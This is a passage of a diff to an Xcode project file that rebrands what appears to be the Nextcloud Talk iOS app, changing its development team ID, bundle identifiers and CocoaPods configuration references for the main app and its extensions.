 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
@@ -2756,7 +2764,7 @@
 		};
 		1FF2FD742AB99CCB000C9905 /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = A8F95DE6635ABC1E64CA8E4A /* Pods-BroadcastUploadExtension.release.xcconfig */;
+			baseConfigurationReference = 936E58A239A75F6C1BECB359 /* Pods-BroadcastUploadExtension.release.xcconfig */;
 			buildSettings = {
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
 				CLANG_ENABLE_OBJC_WEAK = YES;
@@ -2766,7 +2774,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				GCC_C_LANGUAGE_STANDARD = gnu11;
 				GCC_PREPROCESSOR_DEFINITIONS = (
 					"$(inherited)",
@@ -2785,7 +2793,7 @@
 				);
 				MARKETING_VERSION = 1.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.BroadcastUploadExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.BroadcastUploadExtension;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
@@ -2915,7 +2923,7 @@
 		};
 		2C0574981EDD9E8E00D9E7F2 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 4202C63030F0FFBB1C16D75E /* Pods-NextcloudTalk.debug.xcconfig */;
+			baseConfigurationReference = 0DF4645C9F26DA7B73E5C647 /* Pods-Tassos Talk.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_INCLUDE_ALL_APPICON_ASSETS = NO;
@@ -2926,7 +2934,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
 				DEFINES_MODULE = YES;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
@@ -2949,7 +2957,7 @@
 				);
 				LIBRARY_SEARCH_PATHS = "$(inherited)";
 				MARKETING_VERSION = 23.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_OBJC_BRIDGING_HEADER = "NextcloudTalk/NextcloudTalk-Bridging-Header.h";
@@ -2961,7 +2969,7 @@
 		};
 		2C0574991EDD9E8E00D9E7F2 /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 4D4C7BF2F97F47B0D9094618 /* Pods-NextcloudTalk.release.xcconfig */;
+			baseConfigurationReference = 95F3937A0BB375ECE68225A9 /* Pods-Tassos Talk.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_INCLUDE_ALL_APPICON_ASSETS = NO;
@@ -2972,7 +2980,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
 				DEFINES_MODULE = YES;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
@@ -2995,7 +3003,7 @@
 				);
 				LIBRARY_SEARCH_PATHS = "$(inherited)";
 				MARKETING_VERSION = 23.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_OBJC_BRIDGING_HEADER = "NextcloudTalk/NextcloudTalk-Bridging-Header.h";
@@ -3006,7 +3014,7 @@
 		};
 		2C62AFAF24C08845007E460A /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 584BF273DF09DE4D5EE0DA0F /* Pods-ShareExtension.debug.xcconfig */;
+			baseConfigurationReference = BF1B099F9CA45187181D47CE /* Pods-ShareExtension.debug.xcconfig */;
 			buildSettings = {
 				APPLICATION_EXTENSION_API_ONLY = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
@@ -3027,7 +3035,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
 				DEFINES_MODULE = YES;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
@@ -3082,7 +3090,7 @@
 				MARKETING_VERSION = 23.0.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.ShareExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.ShareExtension;
 				PRODUCT_NAME = ShareExtension;
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
@@ -3097,7 +3105,7 @@
 		};
 		2C62AFB024C08845007E460A /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 95D756208A81284B975853EC /* Pods-ShareExtension.release.xcconfig */;
+			baseConfigurationReference = B113E0AADDDE0C7AC469DBD3 /* Pods-ShareExtension.release.xcconfig */;
 			buildSettings = {
 				APPLICATION_EXTENSION_API_ONLY = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
@@ -3118,7 +3126,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
 				DEFINES_MODULE = YES;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
@@ -3172,7 +3180,7 @@
 				);
 				MARKETING_VERSION = 23.0.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.ShareExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.ShareExtension;
 				PRODUCT_NAME = ShareExtension;
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
@@ -3186,7 +3194,7 @@
 		};
 		2CC0015824A1F0E900A20167 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = D6DF51D976DC0F681FF83F7B /* Pods-NotificationServiceExtension.debug.xcconfig */;
+			baseConfigurationReference = 41F18CD98EBA46532E32023E /* Pods-NotificationServiceExtension.debug.xcconfig */;
 			buildSettings = {
 				APPLICATION_EXTENSION_API_ONLY = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
@@ -3206,7 +3214,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
@@ -3244,7 +3252,7 @@
 				MARKETING_VERSION = 23.0.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.NotificationServiceExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NotificationServiceExtension;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
@@ -3258,7 +3266,7 @@
 		};
 		2CC0015924A1F0E900A20167 /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = D86091EC1125C3057B9A299B /* Pods-NotificationServiceExtension.release.xcconfig */;
+			baseConfigurationReference = 19AD4B3E37C340651C4737A1 /* Pods-NotificationServiceExtension.release.xcconfig */;
 			buildSettings = {
 				APPLICATION_EXTENSION_API_ONLY = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
@@ -3278,7 +3286,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = NKUJUXUJ3B;
+				DEVELOPMENT_TEAM = KC28TW5938;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
@@ -3315,7 +3323,7 @@
 				LIBRARY_SEARCH_PATHS = "$(inherited)";
 				MARKETING_VERSION = 23.0.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk.NotificationServiceExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NotificationServiceExtension;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
